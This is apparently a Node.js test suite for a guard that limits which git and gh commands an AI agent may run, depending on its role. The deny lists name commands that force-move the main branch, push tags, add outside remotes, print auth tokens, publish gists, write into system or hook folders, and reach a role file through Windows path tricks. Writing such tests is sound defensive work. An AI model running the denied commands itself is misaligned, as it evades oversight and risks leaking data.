/**
 * W5-1b: Tech Lead's six gaps (1ac28fd) and Security's W5S-1 / W5S-2 (b578f11), plus the two review comments on W5-1.
 * Runs against the staged guard in scripts/guard-next/.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, realpathSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path, { join } from 'node:path';

import { guard, lib, makeRepo } from './guard-016-helpers.js';

const decide = (root, command) => guard.decide({ tool: 'Bash', command, cwd: root });
const verdict = (t, command, role = 'builder') => decide(makeRepo(t, role), command);
const denied = (t, c, role) => { const v = verdict(t, c, role); assert.equal(v.allow, false, `should deny (${role ?? 'builder'}): ${c}`); return v.reason; };
const allowed = (t, c, role) => { const v = verdict(t, c, role); assert.equal(v.allow, true, `should allow (${role ?? 'builder'}): ${c}\n${v.reason ?? ''}`); };

test('W5-1b: pushing a tag, or all tags, is refused for a builder; a branch push is not', (t) => {
  for (const c of ['git push --tags origin', 'git push origin --tags', 'git push --tag origin', 'git push --follow-tags origin claude/x', 'git push origin tag v1', 'git push origin refs/tags/v1',
    'git push origin v1:refs/tags/v1', 'git push origin :refs/tags/v1', 'git push origin +HEAD:refs/tags/v1']) denied(t, c);
  allowed(t, 'git push origin claude/builder-x');
  allowed(t, 'git push -u origin HEAD');
  allowed(t, 'git tag v1');
  allowed(t, 'git push --tags origin', 'release-ops');
});

test('W5-1b: adding or changing a remote url, and pushing to a bare address, are refused', (t) => {
  for (const c of ['git remote add evil https://example.test/x.git', 'git remote set-url origin https://example.test/x.git', 'git remote set-url --push origin ssh://x/y', 'git -C d remote add o x']) denied(t, c);
  allowed(t, 'git remote -v');
  allowed(t, 'git remote show origin');
  for (const c of ['git push https://example.test/x.git claude/x', 'git push git@github.com:o/r.git claude/x', 'git push ssh://git@host/r.git HEAD', 'git push ../other-repo claude/x', 'git push /srv/repo.git claude/x', 'git push C:\\repos\\x claude/x', 'git push --repo=https://example.test/x.git claude/x', 'git push --repo https://example.test/x.git claude/x']) denied(t, c);
  allowed(t, 'git push origin claude/x');
  allowed(t, 'git remote add evil https://example.test/x.git', 'chief-of-staff');
  allowed(t, 'git push https://example.test/x.git claude/x', 'release-ops');
});

test('W5-1b: moving the live branch label by force is refused; ordinary branch work is not', (t) => {
  for (const c of ['git branch -f main HEAD~1', 'git branch --force main abc123', 'git branch -M main', 'git branch -M other main', 'git branch -m main old-main', 'git branch -D main', 'git branch -d main',
    'git checkout -B main origin/main', 'git switch -C main', 'git switch --force-create main', 'git branch -f refs/heads/main HEAD']) denied(t, c);
  allowed(t, 'git branch claude/new');
  allowed(t, 'git branch -f claude/old HEAD');
  allowed(t, 'git checkout -b claude/x');
  allowed(t, 'git checkout main');
  allowed(t, 'git switch claude/x');
  allowed(t, 'git branch -D claude/old');
  allowed(t, 'git branch -f main HEAD', 'chief-of-staff');
});

test('W5-1b: checkout-index is a git command the guard knows', (t) => {
  allowed(t, 'git checkout-index -f src/a.js');
  denied(t, 'git frobnicate');
});

test('W5S-1: git push --repo=origin main is read as a push to main (the word after --repo is a refspec, not the remote)', (t) => {
  assert.match(denied(t, 'git push --repo=origin main'), /live|main/i);
  denied(t, 'git push --repo origin main');
  denied(t, 'git push --rep=origin main');
  denied(t, 'git push --repo=origin HEAD:main');
  allowed(t, 'git push --repo=origin claude/x');
  allowed(t, 'git push --repo=origin main', 'release-ops');
});

test('W5S-2: gh for a role that may not publish is an allowlist: reads, pr comment, and pr create on a claude/* branch', (t) => {
  for (const c of ['gh gist create f.txt', 'gh gist create --public f.txt', 'gh repo create x --public', 'gh repo fork o/r', 'gh pr review 12 --approve', 'gh pr review 12 --comment -b hi', 'gh pr edit 12 --title x', 'gh pr checkout 12',
    'gh issue create --title x', 'gh issue comment 3 -b hi', 'gh issue close 3', 'gh repo clone o/r', 'gh codespace create', 'gh run rerun 5', 'gh run cancel 5', 'gh workflow run b.yml', 'gh cache delete x', 'gh auth token', 'gh auth login', 'gh browse',
    'gh pr create --title x --body y --head main', 'gh pr create --head owner:main', 'gh extension list-nothing']) denied(t, c);
  for (const c of ['gh pr view 12', 'gh pr list', 'gh pr status', 'gh pr diff 12', 'gh pr checks 12', 'gh issue view 3', 'gh issue list', 'gh run list', 'gh run view 5', 'gh repo view', 'gh release view v1', 'gh release list',
    'gh auth status', 'gh status', 'gh search issues x', 'gh gist view abc', 'gh pr comment 12 -b hi', 'gh pr create --title x --body y --head claude/builder-x', 'gh pr create --head owner:claude/x --title t',
    'gh api repos/o/r/pulls', 'gh api -X GET repos/o/r', 'gh --version', 'gh -R o/r pr view 3']) allowed(t, c);
  allowed(t, 'gh gist create f.txt', 'chief-of-staff');
  allowed(t, 'gh repo create x --public', 'release-ops');
});

test('W5S-2: gh pr create with no --head uses the current branch: claude/* is allowed, anything else is refused', (t) => {
  const root = makeRepo(t, 'builder');
  execFileSync('git', ['commit', '-q', '--allow-empty', '-m', 'seed'], { cwd: root });
  execFileSync('git', ['checkout', '-q', '-b', 'claude/builder-x'], { cwd: root });
  assert.equal(decide(root, 'gh pr create --title t --body b').allow, true);
  execFileSync('git', ['checkout', '-q', '-b', 'feature/x'], { cwd: root });
  assert.equal(decide(root, 'gh pr create --title t --body b').allow, false);
});

test('W5-1 review: isRoleFile reads the canonical path: .., trailing dots and spaces, streams, device prefixes and links', (t) => {
  const W = path.win32;
  const is = (p, cwd = 'D:\\repo') => lib.isRoleFile(p, cwd, W, { canonical: false });
  assert.equal(is('.git\\bootstrap-role'), true);
  assert.equal(is('.git\\worktrees\\w1\\bootstrap-role'), true);
  assert.equal(is('docs\\..\\.git\\bootstrap-role'), true);
  assert.equal(is('.git\\bootstrap-role.'), true);
  assert.equal(is('.git\\bootstrap-role '), true);
  assert.equal(is('.git\\bootstrap-role::$DATA'), true);
  assert.equal(is('.git. \\bootstrap-role'), true);
  assert.equal(is('\\\\?\\D:\\repo\\.git\\bootstrap-role'), true);
  assert.equal(is('\\\\.\\pipe\\x'), true, 'a device path the guard cannot read is refused');
  assert.equal(is('D:\\REPO\\.GIT\\BOOTSTRAP-ROLE'), true);
  assert.equal(is('docs\\bootstrap-role.md'), false);
  assert.equal(is('.git\\config'), false);
  assert.equal(is('src\\.gitx\\bootstrap-role'), false);
  // a link that leads to the file
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'bunny-role-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  mkdirSync(join(root, '.git'));
  writeFileSync(join(root, '.git', 'bootstrap-role'), 'builder\n');
  mkdirSync(join(root, 'docs'));
  try {
    symlinkSync(join(root, '.git'), join(root, 'docs', 'g'), 'junction');
    assert.equal(lib.isRoleFile('docs/g/bootstrap-role', root), true, 'through a junction');
    assert.equal(lib.isRoleFile('docs/g/other', root), false);
  } catch { /* links cannot be made here */ }
});

test('W5-1 review: the gate compares the real hooks folder with this checkout\'s or the main checkout\'s', () => {
  const src = readFileSync(join(import.meta.dirname, '..', 'scripts', 'gate.mjs'), 'utf8');
  assert.match(src, /--git-common-dir/);
  assert.match(src, /realpathSync/);
  assert.doesNotMatch(src, /basename\(dir\) !== '\.githooks'/, 'the old name-only comparison is gone');
});

test('W5-1b review: checkout-index with --prefix, --all or --stdin is refused; named files are judged as write targets', (t) => {
  for (const c of ['git checkout-index --prefix=.bootstrap/ -f a', 'git checkout-index --prefix .githooks/ a', 'git checkout-index -a', 'git checkout-index --all -f', 'git checkout-index --stdin', 'git checkout-index -f .bootstrap/policy.json', 'git checkout-index AGENTS.md']) denied(t, c);
  allowed(t, 'git checkout-index -f src/a.js');
  allowed(t, 'git checkout-index -a', 'chief-of-staff');
});

test('W5-1b review: --repo and a remote word are both judged; every refspec is checked for "tag"; a short tag name is a tag', (t) => {
  denied(t, 'git push --repo=origin https://example.test/a.git main');
  denied(t, 'git push origin claude/x tag v1');
  const root = makeRepo(t, 'builder');
  execFileSync('git', ['commit', '-q', '--allow-empty', '-m', 'seed'], { cwd: root });
  execFileSync('git', ['tag', 'v1'], { cwd: root });
  execFileSync('git', ['branch', 'claude/x'], { cwd: root });
  assert.equal(decide(root, 'git push origin v1').allow, false, 'v1 is a tag');
  assert.equal(decide(root, 'git push origin v1:v1').allow, false);
  assert.equal(decide(root, 'git push origin claude/x').allow, true, 'a branch is not');
  execFileSync('git', ['branch', 'v1'], { cwd: root });
  assert.equal(decide(root, 'git push origin v1').allow, true, 'a name that is both: git pushes the branch');
});

test('W5-1b review: gh pr create head in every spelling; a variable head is refused', (t) => {
  allowed(t, 'gh pr create --head claude/x --title t');
  allowed(t, 'gh pr create -H claude/x --title t');
  allowed(t, 'gh pr create -Hclaude/x --title t');
  allowed(t, 'gh pr create -H=claude/x --title t');
  allowed(t, 'gh pr create --head=claude/x --title t');
  for (const c of ['gh pr create -Hmain --title t', 'gh pr create -H=main --title t', 'gh pr create --head=main', 'gh pr create --head $B', 'gh pr create -H $B', 'gh pr create --head=$B', 'gh pr create -H "$B"']) denied(t, c);
});

test('W5-1b review 2: checkout-index options are matched by their abbreviations; --repo plus a URL word; a source that names a tag', (t) => {
  for (const c of ['git checkout-index --pre=.bootstrap/ a', 'git checkout-index --pref=x a', 'git checkout-index --al', 'git checkout-index --std', 'git checkout-index -fa']) denied(t, c);
  denied(t, 'git push --repo=origin https://example.test/a.git claude/x');
  denied(t, 'git push -o opt --repo=origin https://example.test/a.git claude/x');
  denied(t, 'git push origin tags/v1');
  denied(t, 'git push origin heads/x:tags/v1');
  allowed(t, 'git push origin heads/claude/x');
});

// ---- W5-1c (Security's conditions on 611dee7, ab6e370)

import { prepush } from './guard-016-helpers.js';

test('W5B-1: the live branch label is judged case-insensitively', (t) => {
  for (const c of ['git branch -f Main HEAD', 'git branch -f MAIN HEAD', 'git branch -M Main', 'git branch -D MAIN', 'git checkout -B Main origin/main', 'git switch -C MAIN', 'git branch -f refs/heads/Main HEAD']) denied(t, c);
  allowed(t, 'git branch -f Mainline HEAD');
  allowed(t, 'git branch -f claude/main HEAD');
});

test('W5B-2: git symbolic-ref with a target (or -d) is refused for a builder; reading it is not', (t) => {
  for (const c of ['git symbolic-ref refs/heads/main refs/heads/claude/x', 'git symbolic-ref HEAD refs/heads/main', 'git symbolic-ref -d HEAD', 'git symbolic-ref --delete refs/heads/main', 'git symbolic-ref -m why HEAD refs/heads/x']) denied(t, c);
  allowed(t, 'git symbolic-ref HEAD');
  allowed(t, 'git symbolic-ref --short HEAD');
  allowed(t, 'git symbolic-ref -q HEAD');
  allowed(t, 'git symbolic-ref refs/heads/main refs/heads/claude/x', 'chief-of-staff');
});

test('W5B-3: git worktree add -B (or --force) with the live branch is refused', (t) => {
  for (const c of ['git worktree add -B main ../w', 'git worktree add ../w -B main', 'git worktree add -B Main ../w origin/main', 'git worktree add --force ../w main']) denied(t, c);
  allowed(t, 'git worktree add ../w claude/x');
  allowed(t, 'git worktree add -b claude/new ../w');
  allowed(t, 'git worktree list');
  allowed(t, 'git worktree remove ../w');
});

test('W5B-4: gh download writes only inside the working folder and never into the toolkit or the records', (t) => {
  for (const c of ['gh run download 5 -D .bootstrap', 'gh run download 5 -D .githooks/', 'gh release download v1 --dir=.git/hooks', 'gh release download v1 -D ..', 'gh release download v1 -D ../out', 'gh release download v1 -D C:\\Windows', 'gh run download 5 -D /etc', 'gh release download v1 -D ~/x',
    'gh release download v1 -O AGENTS.md', 'gh release download v1 --output=docs/signoffs/x.md', 'gh run download 5 -D$X', 'gh release download v1 -D']) denied(t, c);
  for (const c of ['gh run download 5', 'gh release download v1', 'gh run download 5 -D artifacts', 'gh release download v1 --dir out/dist', 'gh release download v1 -O out.zip', 'gh release download v1 -O -']) allowed(t, c);
});

test('W5B-5: the pre-push hook refuses tag pushes and deletions for a role that may not push live', (t) => {
  const root = makeRepo(t, 'builder');
  execFileSync('git', ['commit', '-q', '--allow-empty', '-m', 'seed'], { cwd: root });
  const sha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: root, encoding: 'utf8' }).trim();
  const policy = lib.loadPolicy(root);
  const check = (role, remoteRef, localSha = sha) => prepush.checkPush({ root, policy, role, localSha, remoteRef, remoteSha: '0'.repeat(40) });
  assert.ok(check('builder', 'refs/tags/v1').some((e) => /may not push or delete the tag "v1"/.test(e)));
  assert.ok(check('builder', 'refs/tags/v1', '0'.repeat(40)).some((e) => /tag "v1"/.test(e)), 'deleting a tag too');
  assert.ok(check('qa', 'refs/tags/v2').length > 0);
  assert.deepEqual(check('release-ops', 'refs/tags/v1').filter((e) => /tag/.test(e)), []);
  assert.deepEqual(check('chief-of-staff', 'refs/tags/v1').filter((e) => /tag/.test(e)), []);
  assert.deepEqual(check('builder', 'refs/heads/claude/x').filter((e) => /tag/.test(e)), [], 'a branch is not a tag');
});
